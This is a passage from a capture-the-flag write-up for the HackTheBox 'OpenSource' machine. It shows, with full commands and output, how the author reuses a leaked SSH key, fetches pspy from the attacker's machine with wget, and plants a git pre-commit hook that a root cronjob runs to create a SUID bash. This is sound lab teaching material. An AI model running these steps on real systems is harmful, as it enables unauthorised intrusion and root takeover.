**We're in! And we have administrator access!**

**The `home-backup` repository looks interesting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a18.png)

It has a directory called `.ssh`! **Maybe there is a private SSH key?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a19.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a20.png)

Yes!! **Let's copy and paste it to our attacker machine, and set it to be read/write only by our current user.**

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# nano dev01_id_rsa                    
                                                                                                                          
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# chmod 600 dev01_id_rsa
```

**Since we have a private SSH key for user `dev01`, we can login as `dev01` via `ssh`:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/OpenSource]
└─# ssh -i dev01_id_rsa dev01@$RHOSTS
[...]
-bash-4.4$ whoami;hostname;id;ip a
dev01
opensource
uid=1000(dev01) gid=1000(dev01) groups=1000(dev01)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:49:2e brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.164/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:e6:59:a0:70 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

We're user `dev01` and successfully escaped the docker container!

**user.txt:**
```
-bash-4.4$ cat /home/dev01/user.txt 
{Redacted}
```

## dev01 to root

**By doing manual enumeration, I saw a process stood out:**
```
-bash-4.4$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
[...]
root     31541  0.0  0.0  17640  3912 ?        S    12:32   0:00 git push origin main
```

**Let's upload [pspy](https://github.com/DominicBreuker/pspy) and run it to enumerate deeper:**
```
┌──(root🌸siunam)-[/opt/pspy]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

-bash-4.4$ wget http://10.10.14.42/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy
```

```
-bash-4.4$ /tmp/pspy
[...]
2022/09/17 12:38:01 CMD: UID=0    PID=1060   | /bin/bash /usr/local/bin/git-sync 
2022/09/17 12:38:01 CMD: UID=0    PID=1061   | git status --porcelain 
2022/09/17 12:38:01 CMD: UID=0    PID=1063   | git add . 
2022/09/17 12:38:01 CMD: UID=0    PID=1067   | /bin/bash /usr/local/bin/git-sync 
2022/09/17 12:38:01 CMD: UID=0    PID=1068   | git commit -m Backup for 2022-09-17 
2022/09/17 12:38:01 CMD: UID=0    PID=1073   | /bin/bash /usr/local/bin/git-sync 
2022/09/17 12:38:01 CMD: UID=0    PID=1075   | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
```

Hmm... Let's take a look at what the **`/usr/local/bin/git-sync`** does:

```
-bash-4.4$ file /usr/local/bin/git-sync
/usr/local/bin/git-sync: Bourne-Again shell script, ASCII text executable
```

It's a **Bash script** file.

**/usr/local/bin/git-sync:**
```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

If you look closer, **the `git` command is NOT using the absolute path (`/usr/bin/git`), we can leverage this to do relative path exploit!**

Also, **the script will `cd` into `/home/dev01/`.** According to a [blog](https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/), **we can use git hooks to gain root privilege!**

**To do so, I'll:**

- Create a malicious pre-commit hook in `/home/dev01/.git/hooks/`, so it will be ran before `git commit`:

```
-bash-4.4$ pwd
/home/dev01/.git/hooks

-bash-4.4$ cat << EOF > pre-commit
> #!/bin/bash
> cp /bin/bash /tmp/root_bash
> chmod +s /tmp/root_bash
> EOF

-bash-4.4$ chmod +x pre-commit
```

**This Bash script will copy `/bin/bash` into `/tmp/` and called `root_bash`, then add SUID sticky bit into it.**

- Wait for the cronjob runs:

**Verify the exploit works:**
```
-bash-4.4$ ls -lah /tmp
[...]
-rwsr-sr-x  1 root  root  1.1M Sep 17 12:53 root_bash
```

Yes it works!! **Let's spawn a bash shell with SUID privilege!**

```
-bash-4.4$ /tmp/root_bash -p
root_bash-4.4# whoami;hostname;id;ip a
root
opensource
uid=1000(dev01) gid=1000(dev01) euid=0(root) egid=0(root) groups=0(root),1000(dev01)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:49:2e brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.164/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:e6:59:a0:70 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

**root.txt:**
```
root_bash-4.4# cat /root/root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/OpenSource/images/a21.png)

# Conclusion

What we've learned:

1. Directory Enumeration
2. Source Code Review
3. Path Traversal
4. Remotely Modifying Flask Python File via Path Traversal
5. Dynamic Port Forwarding
6. Docker Escape via Private SSH Key On Gitea's Repository
7. Privilege Escalation via Insecure Cronjob